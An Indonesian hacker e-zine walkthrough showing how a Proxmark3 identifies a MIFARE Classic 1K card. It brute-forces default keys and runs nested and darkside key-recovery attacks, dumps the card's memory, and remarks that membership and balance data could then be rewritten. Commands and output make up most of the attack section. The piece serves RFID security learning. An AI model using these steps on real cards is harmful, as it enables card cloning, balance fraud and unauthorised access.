@@ -1,0 +1,634 @@
+                  __                
+  __  __ /7  _   / /____  ()_     __
+,'o/,','/ \,'o| / //_ ,' /7/ \/7,'o/
+|_( \_\/n_/|_,'/ / ,'__////_n_/ |_( 
+              /_/                     
+ECHO MAGAZINE VOLUME XIII, ISSUE XXX, PHILE 0x001.TXT    
+				  
+				  
+Hacker LogBook: Phun with Proxmark3
+y3dips/at/echo/dot/or/dot/id
+
+-----| Introduction
+
+Proxmark3 [1] adalah salah satu perangkat RFID yang cukup powerfull
+dan didesain untuk dapat melakukan aktivitas "snoop", "listen",
+"emulate" semua tag-tag RFID yag mempergunakan frekuensi: Low Frequency
+(125 kHz) sampai ke High Frequency (13.56 MHz). Proxmark3 juga dapat
+berlaku sebagai reader dan juga sebagai tag. Info lebih terkait
+proxmark3 dapat dibaca disini[1][2]
+
+-------| Instalasi Proxmark3 client
+
+Untuk instalasi proxmark3 client dapat mengikuti petunjuk di halaman
+wiki proxmark3 [2], sedangkan untuk di osx mavericks/yosemite saya
+tidak berhasil mengikuti petunjuk yang ada di wiki, dan step-by-step
+installasi di osx saya dokumentasikan disini [3]. Apabila telah
+terinstall dapat menjalankan clientnya meskipun proxmark3 dapat
+digunakan secara sendiri (stand-alone).
+
++------------------------------
+| raiser:client ammar$ ./proxmark3 /dev/tty.usbmodem1421
+| proxmark3> hw version
+| #db# Prox/RFID mark3 RFID instrument
+| #db# bootrom: svn 0 2014-04-01 12:12:24
+| #db# os: svn 0 2014-04-01 12:12:24
+| #db# FPGA image built on 2014/03/24 at 21:54:44
+| uC: AT91SAM7S256 Rev B
+| Embedded Processor: ARM7TDMI
+| Nonvolatile Program Memory Size: 256K bytes
+| Second Nonvolatile Program Memory Size: None
+| Internal SRAM Size: 64K bytes
+| Architecture Identifier: AT91SAM7Sxx Series
+| Nonvolatile Program Memory Type: Embedded Flash Memory
++------------------------------
+
+Salah satu hal yang cukup sulit dilakukan saat kita berhadapan dengan
+tag/kartu RFID yang sudah di-"bundle" oleh vendor/user adalah
+menentukan jenis tag/kartu itu apakah mempergunakan Low atau High
+Frequency.
+
+Pada umumnya, berdasarkan jenis frekuensi penggunaannya sebagai
+berikut ini:
+    LF = Door lock, hotel door lock
+    HF = Credit card, etc.
+
+-------| Deteksi LF atau HF
+
+Berdasarkan informasi dari halaman wiki proxmark3 [4], dengan
+mempergunakan proxmark3 cara termudah untuk mendeteksi sebuah
+tag/kartu itu mempergunakan frekuensi apa bahkan sampai jenis apa,
+adalah dengan melihat penurunan voltase saat kartu/tag di dekatkan.
+
+Berikut adalah diambil dari wiki tersebut:
+
+Nominal Tune readings (no tags nearby)
+   # LF antenna @  26 mA / 33972 mV [1273 ohms] 125Khz
+   # LF antenna @  18 mA / 22290 mV [1187 ohms] 134Khz
+   # HF antenna @  60 mA / 14276 mV [235 ohms] 13.56Mhz
+A HID LF prox card :
+
+   # LF antenna @   8 mA / 10205 mV [1273 ohms] 125Khz      [~ 23.5 Volt drop]
+   # LF antenna @   9 mA / 11547 mV [1187 ohms] 134Khz      [~ 10.7 Volt drop]
+   # HF antenna @  60 mA / 14244 mV [235 ohms] 13.56Mhz
+   
+An ISO15693 HF prox card :
+
+   # LF antenna @  26 mA / 33837 mV [1273 ohms] 125Khz
+   # LF antenna @  18 mA / 22290 mV [1187 ohms] 134Khz
+   # HF antenna @  50 mA / 11794 mV [235 ohms] 13.56Mhz    [~ 2.5 Volt drop]
+An ISO14443A HF tag :
+
+   # LF antenna @  26 mA / 33972 mV [1273 ohms] 125Khz
+   # LF antenna @  18 mA / 22155 mV [1187 ohms] 134Khz
+   # HF antenna @  44 mA / 10538 mV [235 ohms] 13.56Mhz   [~ 3.7 Volt drop]
+   
+Baiklah, selanjutnya akan kita cobakan pada kartu yang saya miliki
+mempergunakan antena HF pada kondisi normal tanpa tag/kartu.
+
++----------------------------------
+| proxmark3> hw tune
+| #db# Measuring antenna characteristics, please wait...
+| #db# Measuring complete, sending report back to host
+|
+| # LF antenna:  0.00 V @   125.00 kHz
+| # LF antenna:  0.00 V @   134.00 kHz
+| # LF optimal:  0.00 V @ 12000.00 kHz
+| # HF antenna:  8.35 V @    13.56 MHz
+| # Your LF antenna is unusable.
++----------------------------------
+
+Dan berikut ini kondisi normal dengan antena LF
+
++----------------------------------
+| proxmark3> hw tune
+| #db# Measuring antenna characteristics, please wait...
+| #db# Measuring complete, sending report back to host
+|
+| # LF antenna: 13.02 V @   125.00 kHz
+| # LF antenna: 23.90 V @   134.00 kHz
+| # LF optimal: 25.51 V @   131.87 kHz
+| # HF antenna:  0.45 V @    13.56 MHz
+| # Your HF antenna is unusable.
++----------------------------------
+
+Sekarang saya cobakan kartu RFID yang saya miliki
+
++----------------------------------
+| proxmark3> hw tune
+| #db# Measuring antenna characteristics, please wait...
+| #db# Measuring complete, sending report back to host
+|
+| # LF antenna: 13.02 V @   125.00 kHz
+| # LF antenna: 23.90 V @   134.00 kHz
+| # LF optimal: 25.51 V @   131.87 kHz
+| # HF antenna:  0.55 V @    13.56 MHz
+| # Your HF antenna is unusable.
+| proxmark3> hw tune
+| #db# Measuring antenna characteristics, please wait...
+| #db# Measuring complete, sending report back to host
+|
+| # LF antenna: 13.02 V @   125.00 kHz
+| # LF antenna: 23.90 V @   134.00 kHz
+| # LF optimal: 25.51 V @   131.87 kHz
+| # HF antenna:  0.55 V @    13.56 MHz
+| # Your HF antenna is unusable.
+| proxmark3>
++----------------------------------
+
+Setelah di lakukan sebanyak 2 kali ternyata tidak ada penurunan
+voltase pada LF antenna, maka kemungkinan besar ini adalah kartu
+HF,dan untuk memastikannya kita periksa langsung.
+
++----------------------------------
+| proxmark3> hw tune
+| #db# Measuring antenna characteristics, please wait...
+| #db# Measuring complete, sending report back to host
+|
+| # LF antenna:  0.00 V @   125.00 kHz
+| # LF antenna:  0.00 V @   134.00 kHz
+| # LF optimal:  0.00 V @ 12000.00 kHz
+| # HF antenna:  6.22 V @    13.56 MHz
+| # Your LF antenna is unusable.
++----------------------------------
+
+Dan benar saja votasenya berkurang sekitar 2.15V, yang jika menurut
+wiki berarti ISO15693 HF prox card, untuk proxmark sudah banyak fitur
+yang mendukung standar2 yang di pergunakan pada RFID tag/card, hal ini
+dapat kita lihat dengan menjalankan "command" hf
+
++----------------------------------
+| proxmark3> hf
+| help             This help
+| 14a              { ISO14443A RFIDs... }
+| 14b              { ISO14443B RFIDs... }
+| 15               { ISO15693 RFIDs... }
+| epa              { German Identification Card... }
+| legic            { LEGIC RFIDs... }
+| iclass           { ICLASS RFIDs... }
+| mf               { MIFARE RFIDs... }
+| tune             Continuously measure HF antenna tuning
++----------------------------------
+
+Sesuai wiki maka kita dapat mempergunakan command hf 15, karena
+termasuk ISO15693 HF 
+
++----------------------------------
+| proxmark3> hf 15
+| help             This help
+| demod            Demodulate ISO15693 from tag
+| read             Read HF tag (ISO 15693)
+| record           Record Samples (ISO 15693)
+| reader           Act like an ISO15693 reader
+| sim              Fake an ISO15693 tag
+| cmd              Send direct commands to ISO15693 tag
+| findafi          Brute force AFI of an ISO15693 tag
+| dumpmemory       Read all memory pages of an ISO15693 tag
+| proxmark3>
++----------------------------------
+
+Kita coba untuk membaca tag dengan perintah hf 15 read
+
++----------------------------------
+| proxmark3> hf 15 reader
+| #db# 0 octets read from IDENTIFY request:
+| #db# 0 octets read from SELECT request:
+| #db# 0 octets read from XXX request:
+| proxmark3> hf 15 dumpmemory
+| No Tag found.
+| proxmark3>
++----------------------------------
+
+Tetapi setelah kita jalankan beberapa command, seperti mensimulasi
+reader, ternyata tidak terbaca apapun. Berdasarkan pengalaman saya
+pribadi, umumnya deteksi voltase untuk menentukan jenis tag/card
+terkadang tidak 100% valid, khususnya untuk kartu ini, oleh karena itu
+saya menjalankan beberapa standar untuk kartu ini dan ternyata dengan
+mempergunakan standar 14a kartu dapat terbaca.
+
++----------------------------------
+| proxmark3> hf 14a
+| help             This help
+| list             List ISO 14443a history
+| reader           Act like an ISO14443 Type A reader
+| cuids            <n> Collect n>0 ISO14443 Type A UIDs in one go
+| sim              <UID> -- Fake ISO 14443a tag
+| snoop            Eavesdrop ISO 14443 Type A
+| raw              Send raw hex data to tag
+| proxmark3> hf 14a reader
+| ATQA : 04 00
+|  UID : d7 52 a8 b9
+|  SAK : 08 [2]
+| TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
+| proprietary non iso14443a-4 card found, RATS not supported
+|proxmark3>
++----------------------------------
+
+Dan diketahui bahwa kartu RFID ini adalah variant Mifare Clasic 1k
+atau 1024 bytes.  Kartu ini terbagi dalam 16 sector dan tiap sector di
+lindungi dengan 2 jenis kunci yang berbeda yaitu A dan B. Mifare
+merupakan salah satu jenis kartu RFID yang paling banyak dipergunakan.
+Dan jenis Mifare ini didukung penuh oleh proxmark dengan command hf mf
+
++----------------------------------
+| proxmark3> hf mf
+| help             This help
+| dbg              Set default debug mode
+| rdbl             Read MIFARE classic block
+| urdbl            Read MIFARE Ultralight block
+| urdcard          Read MIFARE Ultralight Card
+| uwrbl            Write MIFARE Ultralight block
+| rdsc             Read MIFARE classic sector
+| dump             Dump MIFARE classic tag to binary file
+| restore          Restore MIFARE classic binary file to BLANK tag
+| wrbl             Write MIFARE classic block
+| chk              Test block keys
+| mifare           Read parity error messages.
+| nested           Test nested authentication
+| sniff            Sniff card-reader communication
+| sim              Simulate MIFARE card
+| eclr             Clear simulator memory block
+| eget             Get simulator memory block
+| eset             Set simulator memory block
+| eload            Load from file emul dump
+| esave            Save to file emul dump
+| ecfill           Fill simulator memory with help of keys from simulator
+| ekeyprn          Print keys from simulator memory
+| csetuid          Set UID for magic Chinese card
+| csetblk          Write block into magic Chinese card
+| cgetblk          Read block from magic Chinese card
+| cgetsc           Read sector from magic Chinese card
+| cload            Load dump into magic Chinese card
+| csave            Save dump from magic Chinese card into file or emulator
+| proxmark3>
++----------------------------------
+
+dikarenakan versi mifare umumnya memiliki keys untuk melakukan
+enkripsi maka pada proxmark terdapat command chk yang bertujuan untuk
+melakukan bruteforce berdasarkan "default keys" yang umumnya di
+pergunakan oleh vendor. Yaitu dengan perintah hf mf chk atau dapat
+mendefinisikan kamus "key" jika ada.
+
++----------------------------------
+| proxmark3> hf mf chk
+| Usage:  hf mf chk <block number>/<*card memory> <key type (A/B/?)> [t] [<key (12 hex symbols)>] [<dic (*.dic)>]
+|           * - all sectors
+| card memory - 0 - MINI(320 bytes), 1 - 1K, 2 - 2K, 4 - 4K, <other> - 1K
+|       sample: hf mf chk 0 A 1234567890ab keys.dic
+|               hf mf chk *1 ? t
+| proxmark3>
++----------------------------------
+
+Untuk Mifare 1K kita gunakan 1, dan kita coba bruteforce keys
+diseluruh sector
+
++----------------------------------
+| proxmark3> hf mf chk *1 ? t
+| No key specified,try default keys
+| chk default key[0] ffffffffffff
+| chk default key[1] 000000000000
+| chk default key[2] a0a1a2a3a4a5
+| chk default key[3] b0b1b2b3b4b5
+| chk default key[4] aabbccddeeff
+| chk default key[5] 4d3a99c351dd
+| chk default key[6] 1a982c7e459a
+| chk default key[7] d3f7d3f7d3f7
+| chk default key[8] 714c5c886e97
+| chk default key[9] 587ee5f9350f
+| chk default key[10] a0478cc39091
+| chk default key[11] 533cb6c723f6
+| chk default key[12] 8fd0a4f256e9
+| --SectorsCnt:0 block no:0x03 key type:A key count:13
+| --SectorsCnt:1 block no:0x07 key type:A key count:13
+| --SectorsCnt:2 block no:0x0b key type:A key count:13
+| --SectorsCnt:3 block no:0x0f key type:A key count:13
+| --SectorsCnt:4 block no:0x13 key type:A key count:13
+| --SectorsCnt:5 block no:0x17 key type:A key count:13
+| --SectorsCnt:6 block no:0x1b key type:A key count:13
+| --SectorsCnt:7 block no:0x1f key type:A key count:13
+| --SectorsCnt:8 block no:0x23 key type:A key count:13
+| --SectorsCnt:9 block no:0x27 key type:A key count:13
+| --SectorsCnt:10 block no:0x2b key type:A key count:13
+| --SectorsCnt:11 block no:0x2f key type:A key count:13
+| --SectorsCnt:12 block no:0x33 key type:A key count:13
+| --SectorsCnt:13 block no:0x37 key type:A key count:13
+| --SectorsCnt:14 block no:0x3b key type:A key count:13
+| --SectorsCnt:15 block no:0x3f key type:A key count:13
+| --SectorsCnt:0 block no:0x03 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:1 block no:0x07 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:2 block no:0x0b key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:3 block no:0x0f key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:4 block no:0x13 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:5 block no:0x17 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:6 block no:0x1b key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:7 block no:0x1f key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:8 block no:0x23 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:9 block no:0x27 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:10 block no:0x2b key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:11 block no:0x2f key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:12 block no:0x33 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:13 block no:0x37 key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:14 block no:0x3b key type:B key count:13
+| Found valid key:[000000000000]
+| --SectorsCnt:15 block no:0x3f key type:B key count:13
+| Found valid key:[000000000000]
++----------------------------------
+
+dan di temukan kunci B=000000000000, yang dapat kita pergunakan juga
+untuk menemukan keseluruhan kunci dengan perintah hf mf nested
+mempergunakan kunci yang telah di temukan.
+
++----------------------------------
+| proxmark3> hf mf nested
+| Usage:
+|  all sectors:  hf mf nested  <card memory> <block number> <key A/B> <key (12 hex symbols)> [t,d]
+|  one sector:   hf mf nested  o <block number> <key A/B> <key (12 hex symbols)>
+|                <target block number> <target key A/B> [t]
+| card memory - 0 - MINI(320 bytes), 1 - 1K, 2 - 2K, 4 - 4K, <other> - 1K
+| t - transfer keys into emulator memory
+| d - write keys to binary file
+|
+|      sample1: hf mf nested 1 0 A FFFFFFFFFFFF
+|      sample1: hf mf nested 1 0 A FFFFFFFFFFFF t
+|      sample1: hf mf nested 1 0 A FFFFFFFFFFFF d
+|      sample2: hf mf nested o 0 A FFFFFFFFFFFF 4 A
++----------------------------------
+
+Command yang akan kita pergunakan adalah "hf mf nested 1 0 B
+000000000000"
+
++----------------------------------
+| proxmark3> hf mf nested 1 0 B 000000000000
+| --block no:00 key type:01 key:00 00 00 00 00 00  etrans:0
+| Block shift=0
+| Testing known keys. Sector count=16
+| nested...
+| -----------------------------------------------
+| uid:d752a8b9 len=2 trgbl=0 trgkey=0
+| -----------------------------------------------
+| uid:d752a8b9 len=2 trgbl=4 trgkey=0
+| -----------------------------------------------
+| uid:d752a8b9 len=2 trgbl=8 trgkey=0
+| Found valid key:46c16846c168
+| -----------truncated--------------
+| 
+| Iterations count: 101
+| 
+| 
+| |---|----------------|---|----------------|---|
+| |sec|key A           |res|key B           |res|
+| |---|----------------|---|----------------|---|
+| |000|  46c16846c168  | 0 |  000000000000  | 1 |
+| |001|  46c16846c168  | 1 |  000000000000  | 1 |
+| |002|  46c16846c168  | 1 |  000000000000  | 1 |
+| |003|  46c16846c168  | 0 |  000000000000  | 1 |
+| |004|  46c16846c168  | 1 |  000000000000  | 1 |
+| |005|  46c16846c168  | 1 |  000000000000  | 1 |
+| |006|  46c16846c168  | 0 |  000000000000  | 1 |
+| |007|  46c16846c168  | 0 |  000000000000  | 1 |
+| |008|  46c16846c168  | 0 |  000000000000  | 1 |
+| |009|  46c16846c168  | 1 |  000000000000  | 1 |
+| |010|  46c16846c168  | 0 |  000000000000  | 1 |
+| |011|  46c16846c168  | 0 |  000000000000  | 1 |
+| |012|  46c16846c168  | 1 |  000000000000  | 1 |
+| |013|  46c16846c168  | 1 |  000000000000  | 1 |
+| |014|  46c16846c168  | 1 |  000000000000  | 1 |
+| |015|  46c16846c168  | 1 |  000000000000  | 1 |
+| |---|----------------|---|----------------|---|
++----------------------------------
+
+Dan kita dapatkan seluruh kunci di setiap sector yang akan dapat kita
+pergunakan untuk mendekripsi data di tiap-tiap sektor nantinya.
+
+Atau ada 1 perintah lagi yang dapat dipergunakan secara langsung untuk
+merecovery key yang di pergunakan pada mifare yaitu "hf mf mifare"
+
++----------------------------------
+| proxmark3> hf mf mifare
+| -------------------------------------------------------------------------
+| Executing command. Expected execution time: 25sec on average  :-)
+| Press the key on the proxmark3 device to abort both proxmark3 and client.
+| -------------------------------------------------------------------------
+| .#db# Mifare: Can't select card
+| #db# Mifare: Can't select card
+| #db# Mifare: Can't select card
+| ---- truncated ----------------
+| 
+| |diff|{nr}    |ks3|ks3^5|parity         |
+| +----+--------+---+-----+---------------+
+| | 00 |00000006| 3 |  6  |0,0,0,0,0,0,0,0|
+| | 20 |00000026| b |  e  |0,0,0,0,0,0,0,0|
+| | 40 |00000046| 9 |  c  |0,0,0,0,0,0,0,0|
+| | 60 |00000066| d |  8  |0,0,0,0,0,0,0,0|
+| | 80 |00000086| 4 |  1  |0,0,0,0,0,0,0,0|
+| | a0 |000000a6| c |  9  |0,0,0,0,0,0,0,0|
+| | c0 |000000c6| d |  8  |0,0,0,0,0,0,0,0|
+| | e0 |000000e6| 0 |  5  |0,0,0,0,0,0,0,0|
+| parity is all zero,try special attack!just wait for few more seconds...
+| p1:856d p2:33cbb p3:0 key:46c16846c168
+| key_count:1
+| ------------------------------------------------------------------
+| Key found:46c16846c168
+| 
+| Found valid key:46c16846c168
+| proxmark3>
++----------------------------------
+
+Dan ditemukan valid key yang dapat dipergunakan juga untuk merecovery
+key lain di sector lainnya.  "hf mf mifare" terkadang lebih ampuh
+dibanding dengan perintah chk yang melakukan bruteforce berdasarkan
+default keys yang umum di pergunakan. Oleh karena itu apabila "hf mf
+chk" tidak berhasil merecover keys anda dapat langsung menjalankan "hf
+mf mifare".
+
+Selanjutnya gunakan "hf mf nested" kembali tetapi kali ini kita
+tambahkan opsi "d" untuk menyimpan key ke file "dumpkeys.bin" yang
+akan di pakai untuk mendecrypt tag/kartu nantinya.
+
++----------------------------------
+| proxmark3> hf mf nested 1 0 a 46c16846c168 d
+| --block no:00 key type:00 key:46 c1 68 46 c1 68  etrans:0
+| Block shift=0
+| Testing known keys. Sector count=16
+| nested...
+| Time in nested: 0.038 (inf sec per key)
+| 
+| -----------------------------------------------
+| Iterations count: 0
+| 
+| 
+| |---|----------------|---|----------------|---|
+| |sec|key A           |res|key B           |res|
+| |---|----------------|---|----------------|---|
+| |000|  46c16846c168  | 1 |  000000000000  | 1 |
+| |001|  46c16846c168  | 1 |  000000000000  | 1 |
+| |002|  46c16846c168  | 1 |  000000000000  | 1 |
+| |003|  46c16846c168  | 1 |  000000000000  | 1 |
+| |004|  46c16846c168  | 1 |  000000000000  | 1 |
+| |005|  46c16846c168  | 1 |  000000000000  | 1 |
+| |006|  46c16846c168  | 1 |  000000000000  | 1 |
+| |007|  46c16846c168  | 1 |  000000000000  | 1 |
+| |008|  46c16846c168  | 1 |  000000000000  | 1 |
+| |009|  46c16846c168  | 1 |  000000000000  | 1 |
+| |010|  46c16846c168  | 1 |  000000000000  | 1 |
+| |011|  46c16846c168  | 1 |  000000000000  | 1 |
+| |012|  46c16846c168  | 1 |  000000000000  | 1 |
+| |013|  46c16846c168  | 1 |  000000000000  | 1 |
+| |014|  46c16846c168  | 1 |  000000000000  | 1 |
+| |015|  46c16846c168  | 1 |  000000000000  | 1 |
+| |---|----------------|---|----------------|---|
+| Printing keys to bynary file dumpkeys.bin...
+| proxmark3> 
++----------------------------------
+
+Selanjutnya kita akan men-"dump" isi dari kartu RFID ini dengan
+perintah "dump" 
+
++----------------------------------
+| proxmark3> hf mf dump
+| |-----------------------------------------|
+| |------ Reading sector access bits...-----|
+| |-----------------------------------------|
+| #db# READ BLOCK FINISHED
+| #db# READ BLOCK FINISHED
+|  ---- truncated ----
+| #db# READ BLOCK FINISHED
+| |-----------------------------------------|
+| |----- Dumping all blocks to file... -----|
+| |-----------------------------------------|
+| #db# READ BLOCK FINISHED
+| Dumped card data into 'dumpdata.bin'
+|  ---- truncated ----
+| #db# READ BLOCK FINISHED
+| Dumped card data into 'dumpdata.bin'
++----------------------------------
+
+Dan hasil dump akan tersimpan ke file dumpdata.bin yang apabila kita
+lihat hasilnya
+
++----------------------------------
+| raiser:client ammar$ xxd dumpdata.bin
+| 0000000: d752 a8b9 9408 0400 6263 6465 6667 6869  .R......bcdefghi
+| 0000010: 0000 0000 0000 0000 6e53 3301 3354 3301  ........nS3.3T3.
+| 0000020: d500 0100 0000 0000 0000 00f2 75fa 0501  ............u...
+| 0000030: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000040: 3130 3030 3030 3030 3030 3030 3030 3031  1000000000000001
+| 0000050: 3232 3138 0400 0000 0000 0000 0000 0000  2218............
+| 0000060: 0000 0000 0000 0000 5245 4755 4c41 5200  ........REGULAR.
+| 0000070: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000090: 0000 0000 ffc9 9a3b 0000 0000 3b00 0000  .......;....;...
+| 00000a0: 0000 0000 0088 d340 0000 0000 0000 0000  .......@........
+| 00000b0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 00000c0: fe22 5714 5fa2 a5d4 05be 045f abca 1281  ."W._......_....
+| 00000d0: 6209 85ee 6942 6a2a 9ac9 6ef0 89da f4cf  b...iBj*..n.....
+| 00000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00000f0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000130: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000140: 3a00 0044 0000 0000 0100 cf53 3301 8105  :..D.......S3...
+| 0000150: 3936 3036 3700 0000 0000 0000 007c c540  96067........|.@
+| 0000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000170: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00001a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00001b0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 00001c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00001d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00001e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00001f0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000200: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000210: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000220: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000230: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000240: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000260: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000270: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000280: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000290: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00002a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00002b0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 00002c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00002d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00002e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00002f0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000300: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000310: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000320: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000330: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000340: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000350: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000360: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000370: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 0000380: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 0000390: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00003a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00003b0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+| 00003c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00003d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00003e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+| 00003f0: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
++----------------------------------
+
+Untuk hasil dengan format lebih baik dapat kita gunakan script .lua
+yang tersedia untuk menjadikan outpunya html
+
++----------------------------------
+| proxmark3> script run htmldump
+| --- Executing: ./scripts/htmldump.lua, args''
+| Wrote a HTML dump to the file 2014-12-15_185529.html
+| 
+| -----Finished
+| proxmark3>
++----------------------------------
+
+Dan tentunya data yang menarik perhatian adalah bagian berikut ini:
+
+| 0000070: 46c1 6846 c168 7787 8800 0000 0000 0000  F.hF.hw.........
+
+Dimana 46c1 6846 c168 adalah Key A, 0000 0000 0000 adalah Key B dan
+7787 8800 adalah Access Bits. selanjutnya adalah bagian Data 
+
+| 0000060: 0000 0000 0000 0000 5245 4755 4c41 5200  ........REGULAR.
+
+Kemungkinan "REGULAR" adalah jenis ke anggotaan dan juga "balance"
+yang ada, dengan mendapatkan Key A dan Key B kita dapat mengupdate
+data dan melakukan penulisan ulang ke kartu. Untuk lebih detail
+memahami dapat membaca-baca mengenai Mifare 1K[5].
+
+-----| Penutup
+
+Artikel ini hanya membahas seputar kartu Mifare 1k, dan ini baru
+membaca data didalamnya termasuk melakukan burteforce key. Masih
+banyak yang dapat dilakukan dan menjadi lebih mudah dengan fitur-fitur
+dan "command" yang terdapat di proxmark3 client baik untuk menulis,
+melakukan "clone" dsb.
+
+Semoga sedikit artikel ini memberikan manfaat dan wawasan terkait RFID
+secara umum dan keamananya pada khususnya.
+
+-----| Referensi
+
+[1]http://proxmark3.com
+[2]https://code.google.com/p/proxmark3/wiki/
+[3]https://gist.github.com/y3dips/090abf54ec0d36a4adea
+[4]https://code.google.com/p/proxmark3/wiki/RunningPM3
+[5]http://www.nxp.com/documents/data_sheet/MF1S503x.pdf
